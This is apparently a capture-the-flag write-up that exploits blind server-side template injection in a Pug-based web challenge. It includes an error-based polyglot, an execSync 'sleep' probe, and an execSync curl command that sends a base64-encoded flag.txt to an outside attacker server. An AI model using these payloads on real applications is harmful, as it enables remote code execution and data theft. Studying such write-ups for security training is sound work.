# 🟢 mytemplates

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

as challenge names says mytemplates we already get the hint

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

we have 2 pages where user can input so we start with SSTI as challenge name hinted

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

no reflection

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
<%'${{/#{@}}%>{{
```

this universal error-based polyglot gave error

{% embed url="https://cheatsheet.hackmanit.de/template-injection-table/index.html" %}

use this table and copy paste polyglot to filter

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

from many template engine to 2 only so let's assume it is Pug as it is Blind SSTI

in Blind SSTI we have 3 options error, sleep or in rare cases callback to our server even sleep is rare

{% embed url="https://www.hackingloops.com/ssti-in-pug/" %}

```
#{process.mainModule.require('child_process').execSync('sleep 5')}
```

this will put to sleep which confirmed Pug

```
#{process.mainModule.require('child_process').execSync('curl https://<name of your server>/$(cat flag.txt | base64)')}
```

this will give name and use base64

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
